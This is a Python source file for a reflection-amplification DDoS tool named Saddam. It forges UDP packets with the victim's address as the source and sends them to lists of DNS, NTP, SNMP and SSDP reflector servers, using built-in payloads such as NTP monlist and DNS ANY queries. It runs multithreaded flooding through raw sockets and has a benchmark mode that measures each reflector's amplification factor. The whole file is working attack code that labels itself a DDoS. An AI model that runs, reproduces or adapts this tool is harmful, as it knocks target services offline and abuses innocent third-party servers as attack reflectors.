#!/usr/bin/env python
import sys
import time
import socket
import struct
import random
import threading
from random import randint
from optparse import OptionParser

# Custom IP and UDP classes to replace the missing pinject module
class IP:
    def __init__(self, source, destination, data, proto=socket.IPPROTO_TCP):
        self.source = source
        self.destination = destination
        self.data = data
        self.proto = proto
        
    def pack(self):
        # IP header fields
        ip_ver = 4
        ip_ihl = 5
        ip_tos = 0
        ip_tot_len = 20 + len(self.data)  # IP header + data
        ip_id = random.randint(0, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = self.proto
        ip_check = 0  # Will be calculated later
        
        # Pack the IP header
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        # Source IP to 32-bit format
        saddr = socket.inet_aton(self.source)
        daddr = socket.inet_aton(self.destination)
        
        # IP header
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               ip_ihl_ver,
                               ip_tos,
                               ip_tot_len,
                               ip_id,
                               ip_frag_off,
                               ip_ttl,
                               ip_proto,
                               ip_check,
                               saddr,
                               daddr)
        
        # Calculate checksum
        ip_check = self.checksum(ip_header)
        
        # Repack with correct checksum
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               ip_ihl_ver,
                               ip_tos,
                               ip_tot_len,
                               ip_id,
                               ip_frag_off,
                               ip_ttl,
                               ip_proto,
                               socket.htons(ip_check),
                               saddr,
                               daddr)
        
        return ip_header
    
    def checksum(self, data):
        """Calculate IP checksum"""
        if len(data) % 2:
            data += b'\x00'
        
        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i+1]
            s += w
        
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s

class UDP:
    def __init__(self, sport, dport, data):
        self.sport = sport
        self.dport = dport
        self.data = data
        
    def pack(self, source, destination):
        # UDP header fields
        udp_length = 8 + len(self.data)
        udp_checksum = 0
        
        # Pack UDP header
        udp_header = struct.pack('!HHHH', 
                                self.sport, 
                                self.dport, 
                                udp_length, 
                                udp_checksum)
        
        # Pseudo header for checksum calculation
        saddr = socket.inet_aton(source)
        daddr = socket.inet_aton(destination)
        placeholder = 0
        protocol = socket.IPPROTO_UDP
        
        pseudo_header = struct.pack('!4s4sBBH',
                                   saddr,
                                   daddr,
                                   placeholder,
                                   protocol,
                                   udp_length)
        
        # Calculate checksum
        udp_checksum = self.checksum(pseudo_header + udp_header + self.data)
        
        # Repack with correct checksum
        udp_header = struct.pack('!HHHH', 
                                self.sport, 
                                self.dport, 
                                udp_length, 
                                udp_checksum)
        
        return udp_header
    
    def checksum(self, data):
        """Calculate UDP checksum"""
        if len(data) % 2:
            data += b'\x00'
        
        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i+1]
            s += w
        
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s

USAGE = '''
%prog target.com [options]        # DDoS
%prog benchmark [options]         # Calculate AMPLIFICATION factor
'''

LOGO = r'''
	   _____           __    __              
	  / ___/____ _____/ /___/ /___ _____ ___ 
	  \__ \/ __ `/ __  / __  / __ `/ __ `__ \
	 ___/ / /_/ / /_/ / /_/ / /_/ / / / / / /
	/____/\__,_/\__,_/\__,_/\__,_/_/ /_/ /_/ 
	https://github.com/OffensivePython/Saddam
	   https://twitter.com/OffensivePython
'''

HELP = (
	'DNS Amplification File and Domains to Resolve (e.g: dns.txt:[evildomain.com|domains_file.txt]',
	'NTP Amplification file',
	'SNMP Amplification file',
	'SSDP Amplification file',
	'Number of threads (default=1)' )

OPTIONS = (
	(('-d', '--dns'), dict(dest='dns', metavar='FILE:FILE|DOMAIN', help=HELP[0])),
	(('-n', '--ntp'), dict(dest='ntp', metavar='FILE', help=HELP[1])),
	(('-s', '--snmp'), dict(dest='snmp', metavar='FILE', help=HELP[2])),
	(('-p', '--ssdp'), dict(dest='ssdp', metavar='FILE', help=HELP[3])),
	(('-t', '--threads'), dict(dest='threads', type=int, default=1, metavar='N', help=HELP[4])) )

BENCHMARK = (
	'Protocol'
	'|  IP  Address  '
	'|     Amplification     '
	'|     Domain    '
	'\n{}').format('-'*75)

ATTACK = (
	'     Sent      '
	'|    Traffic    '
	'|    Packet/s   '
	'|     Bit/s     '
	'\n{}').format('-'*63)

PORT = {
	'dns': 53,
	'ntp': 123,
	'snmp': 161,
	'ssdp': 1900 }

PAYLOAD = {
	'dns': (b'%b\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
			b'%b\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
			b'\x00\x00\x00\x00\x00\x00'),
	'snmp': (b'\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
		b'\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
		b'\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
		b'\x01\x02\x01\x05\x00'),
	'ntp': (b'\x17\x00\x02\x2a' + b'\x00'*4),
	'ssdp': (b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
		b'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
}

amplification = {
	'dns': {},
	'ntp': {},
	'snmp': {},
	'ssdp': {} }

FILE_NAME = 0
FILE_HANDLE = 1

npackets = 0
nbytes = 0
files = {}

SUFFIX = {
	0: '',
	1: 'K',
	2: 'M',
	3: 'G',
	4: 'T'}

npackets_lock = threading.Lock()
nbytes_lock = threading.Lock()

def Calc(n, d, unit=''):
    if n == 0:
        return '0' + unit
    i = 0
    r = float(n)
    while r/d >= 1 and i < len(SUFFIX)-1:
        r = r/d
        i += 1
    return '{:.2f}{}{}'.format(r, SUFFIX[i], unit)

def GetDomainList(domains):
    domain_list = []

    if domains.upper().endswith('.TXT'):
        try:
            with open(domains, 'r') as file:
                for line in file:
                    domain = line.strip()
                    if domain and not domain.startswith('#'):
                        domain_list.append(domain)
        except IOError as e:
            print(f"Error reading domain file {domains}: {e}")
            sys.exit(1)
    else:
        domain_list = [d.strip() for d in domains.split(',') if d.strip()]
    
    if not domain_list:
        print("Error: No valid domains found")
        sys.exit(1)
    
    return domain_list

def Monitor():
    print(ATTACK)
    FMT = '{:^15}|{:^15}|{:^15}|{:^15}'
    start = time.time()
    try:
        while True:
            current = time.time() - start
            if current > 0:
                with npackets_lock:
                    current_packets = npackets
                with nbytes_lock:
                    current_bytes = nbytes
                
                bps = (current_bytes * 8) / current
                pps = current_packets / current
                out = FMT.format(Calc(current_packets, 1000), 
                    Calc(current_bytes, 1024, 'B'), Calc(pps, 1000, 'pps'), Calc(bps, 1000, 'bps'))
                sys.stdout.write('\r{}{}'.format(out, ' '*(60-len(out))))
                sys.stdout.flush()
            time.sleep(1)
    except KeyboardInterrupt:
        print('\nInterrupted')
    except Exception as err:
        print('\nError:', str(err))

def AmpFactor(recvd, sent):
    if sent == 0:
        return 'N/A (0B sent)'
    return '{}x ({}B -> {}B)'.format(recvd//sent, sent, recvd)

def Benchmark(ddos):
    print(BENCHMARK)
    i = 0
    for proto in files:
        try:
            with open(files[proto][FILE_NAME], 'r') as f:
                for soldier in f:
                    soldier = soldier.strip()
                    if soldier:
                        if proto == 'dns':
                            for domain in ddos.domains:
                                i += 1
                                recvd, sent = ddos.GetAmpSize(proto, soldier, domain)
                                if sent > 0 and recvd >= sent:
                                    print('{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
                                        AmpFactor(recvd, sent), domain))
                        else:
                            recvd, sent = ddos.GetAmpSize(proto, soldier)
                            if sent > 0 and recvd >= sent:
                                print('{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
                                    AmpFactor(recvd, sent), 'N/A'))
                                i += 1
        except IOError as e:
            print(f"Error reading file {files[proto][FILE_NAME]}: {e}")
            continue
    print('Total tested:', i)

class DDoS:
    def __init__(self, target, threads, domains, event):
        self.target = target
        self.threads = threads
        self.event = event
        self.domains = domains if domains else []
        
    def stress(self):
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.__attack)
            t.daemon = True
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
            
    def __send(self, sock, soldier, proto, payload):
        try:
            udp = UDP(randint(1, 65535), PORT[proto], payload).pack(self.target, soldier)
            ip = IP(self.target, soldier, udp, proto=socket.IPPROTO_UDP).pack()
            sock.sendto(ip + udp + payload, (soldier, PORT[proto]))
            return True
        except Exception as e:
            return False
            
    def GetAmpSize(self, proto, soldier, domain=''):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(3)
        data = b''
        packet = b''
        
        try:
            if proto in ['ntp', 'ssdp']:
                packet = PAYLOAD[proto]
                sock.sendto(packet, (soldier, PORT[proto]))
                start_time = time.time()
                while time.time() - start_time < 2:  # 2 second timeout
                    try:
                        sock.settimeout(1)
                        chunk, _ = sock.recvfrom(65535)
                        data += chunk
                    except socket.timeout:
                        break
            else:
                if proto == 'dns':
                    packet = self.__GetDnsQuery(domain)
                else:
                    packet = PAYLOAD[proto]
                
                sock.sendto(packet, (soldier, PORT[proto]))
                data, _ = sock.recvfrom(65535)
        except socket.timeout:
            data = b''
        except Exception as e:
            data = b''
        finally:
            sock.close()
            
        return len(data), len(packet)
        
    def __GetQName(self, domain):
        labels = domain.split('.')
        QName = b''
        for label in labels:
            if label:
                QName += struct.pack('B', len(label)) + label.encode('utf-8')
        return QName
        
    def __GetDnsQuery(self, domain):
        id = struct.pack('!H', randint(0, 65535))
        QName = self.__GetQName(domain)
        return PAYLOAD['dns'] % (id, QName)
        
    def __attack(self):
        global npackets, nbytes
        
        _files = {}
        for proto in files:
            try:
                f = open(files[proto][FILE_NAME], 'r')
                _files[proto] = [files[proto][FILE_NAME], f]
            except IOError as e:
                print(f"Error opening file {files[proto][FILE_NAME]}: {e}")
                continue
                
        try:
            # Note: Raw sockets require root privileges
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except (socket.error, PermissionError) as e:
            print(f"Raw socket creation failed: {e}")
            print("This script requires root/administrator privileges for raw socket operations")
            return
            
        try:
            while self.event.is_set():
                for proto in _files:
                    soldier = _files[proto][FILE_HANDLE].readline().strip()
                    if not soldier:
                        _files[proto][FILE_HANDLE].seek(0)
                        soldier = _files[proto][FILE_HANDLE].readline().strip()
                        if not soldier:
                            continue
                    
                    if proto == 'dns':
                        if soldier not in amplification[proto]:
                            amplification[proto][soldier] = {}
                        for domain in self.domains:
                            if domain not in amplification[proto][soldier]:
                                size, sent = self.GetAmpSize(proto, soldier, domain)
                                if size == 0 or size < sent:
                                    continue
                                amplification[proto][soldier][domain] = size
                            
                            amp = self.__GetDnsQuery(domain)
                            if self.__send(sock, soldier, proto, amp):
                                with npackets_lock:
                                    npackets += 1
                                with nbytes_lock:
                                    nbytes += amplification[proto][soldier][domain]
                    else:
                        if soldier not in amplification[proto]:
                            size, sent = self.GetAmpSize(proto, soldier)
                            if size == 0 or size < sent:
                                continue
                            amplification[proto][soldier] = size
                        
                        amp = PAYLOAD[proto]
                        if self.__send(sock, soldier, proto, amp):
                            with npackets_lock:
                                npackets += 1
                            with nbytes_lock:
                                nbytes += amplification[proto][soldier]
        except Exception as e:
            print(f"Error in attack thread: {e}")
        finally:
            sock.close()
            for proto in _files:
                _files[proto][FILE_HANDLE].close()

def main():
    print(LOGO)
    
    parser = OptionParser(usage=USAGE)
    for args, kwargs in OPTIONS:
        parser.add_option(*args, **kwargs)
    options, args = parser.parse_args()
    
    domains = None
    if len(args) < 1:
        parser.print_help()
        sys.exit(1)
        
    if options.dns:
        if ':' not in options.dns:
            print('DNS option requires format: file:domain or file:domain_file.txt')
            sys.exit(1)
        dns_file, domains_str = options.dns.split(':', 1)
        domains = GetDomainList(domains_str)
        if domains:
            files['dns'] = [dns_file]
        else:
            print('No valid domains specified')
            sys.exit(1)
            
    if options.ntp:
        files['ntp'] = [options.ntp]
    if options.snmp:
        files['snmp'] = [options.snmp]
    if options.ssdp:
        files['ssdp'] = [options.ssdp]
        
    if not files:
        parser.print_help()
        sys.exit(1)
        
    event = threading.Event()
    event.set()
    
    if args[0].upper() == 'BENCHMARK':
        ddos = DDoS('127.0.0.1', options.threads, domains, event)  # Dummy target for benchmark
        Benchmark(ddos)
    else:
        try:
            target_ip = socket.gethostbyname(args[0])
            print(f"Target: {args[0]} -> {target_ip}")
        except socket.gaierror:
            print(f"Error: Cannot resolve target {args[0]}")
            sys.exit(1)
            
        ddos = DDoS(target_ip, options.threads, domains, event)
        
        attack_thread = threading.Thread(target=ddos.stress)
        attack_thread.daemon = True
        attack_thread.start()
        
        try:
            Monitor()
        except KeyboardInterrupt:
            print("\nShutting down...")
        finally:
            event.clear()
            attack_thread.join(timeout=2)

if __name__ == '__main__':
    main()
